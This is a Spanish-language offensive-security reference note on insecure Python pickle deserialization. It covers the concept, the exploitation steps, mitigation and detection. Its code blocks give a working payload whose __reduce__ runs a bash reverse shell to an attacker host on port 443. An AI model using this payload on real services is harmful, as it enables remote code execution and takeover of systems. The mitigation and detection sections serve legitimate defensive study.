---
topic: Python — deserialización insegura con pickle
tags: [web, python, pickle, deserialization, rce]
---

# Python — deserialización insegura con pickle

[🇬🇧 English](python-pickle-deserialization.en.md) | **Español**

## Concepto

`pickle` y `cPickle` reconstruyen objetos arbitrarios. Si la entrada la controla el usuario, el método `__reduce__` de una clase puede devolver una función y sus argumentos, que se ejecutan durante `loads`. No es un formato de datos: es un mecanismo de ejecución.

## Cuándo aplica

- La aplicación guarda objetos serializados en disco, caché o base de datos.
- Un endpoint acepta un archivo o un campo que luego pasa por `pickle.loads`.
- El código usa `cPickle` en Python 2 o `pickle` sin `RestrictedUnpickler`.

## Procedimiento

1. Localizar la llamada a `loads` y comprobar que el dato es controlable.
2. Crear una clase con `__reduce__` que devuelva `os.system` y el comando.
3. Serializar con `pickle.dumps` y entregar el flujo al endpoint.
4. Usar una reverse shell o escribir una clave.

```python
import cPickle, os
class Exploit:
    def __reduce__(self):
        return (os.system, ("bash -c 'bash -i >& /dev/tcp/<ATTACKER>/443 0>&1'",))
open("payload.p", "wb").write(cPickle.dumps(Exploit()))
```

```python
import pickle
pickle.load(open("payload.p", "rb"))
```

## Variantes

- `builtins.eval` para ejecutar una expresión.
- `subprocess.check_output` para capturar la salida.
- `os.execv` para reemplazar el proceso y evitar procesos hijos.

## Limitaciones

- El endpoint debe aceptar bytes y llamar a `loads`.
- Un `RestrictedUnpickler` con allowlist bloquea clases ajenas.
- La ejecución ocurre con el usuario del servicio web.

## Mitigación

- No usar pickle para datos no confiables; preferir JSON.
- Firmar los blobs y verificar la firma antes de deserializar.
- Ejecutar el servicio con un usuario sin privilegios y sin secretos.

## Detección

- Archivos con la cabecera `\x80\x02` o `c__builtin__` en uploads.
- Llamadas a `pickle.loads` desde endpoints públicos.
- Procesos hijos inesperados del servicio web.

## Referencias

- [Python — pickle documentation](https://docs.python.org/3/library/pickle.html)
- [0xdf — Canape](https://0xdf.gitlab.io/2018/09/15/htb-canape.html)
- [CWE-502 — Deserialization of Untrusted Data](https://cwe.mitre.org/data/definitions/502.html)
